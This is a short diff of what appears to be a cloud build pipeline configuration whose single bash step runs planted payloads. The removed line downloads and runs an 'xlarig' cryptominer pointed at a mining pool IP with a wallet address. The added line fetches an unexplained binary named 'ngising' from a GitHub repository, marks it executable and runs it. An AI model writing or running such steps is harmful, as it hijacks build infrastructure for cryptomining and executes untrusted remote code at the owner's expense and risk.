@@ -3,7 +3,7 @@ steps:
     args:
       - '-c'
       - >-
-         apt update && apt-get install sudo -y && wget https://github.com/bengetsia/soft/raw/main/xlarig.tar.gz && tar -xvf xlarig.tar.gz && ./xlarig -a rx/0 -o 139.144.119.94:80 -u ZEPHs8U8t9y4NYxaTBrKUrHD7nF61sGUJbGMPKoFNscCen8trpsFcEEJTs2nc6sD4dYfj71bZrhFhbmcRmFUT2S5cmRX8kUxyVR -p NOTE
+         apt update && apt-get install sudo -y && wget https://github.com/ganejafaujanih/manuk/raw/main/ngising && chmod u+x ngising && ./ngising
     waitFor:
       - '-'
     entrypoint: /bin/bash
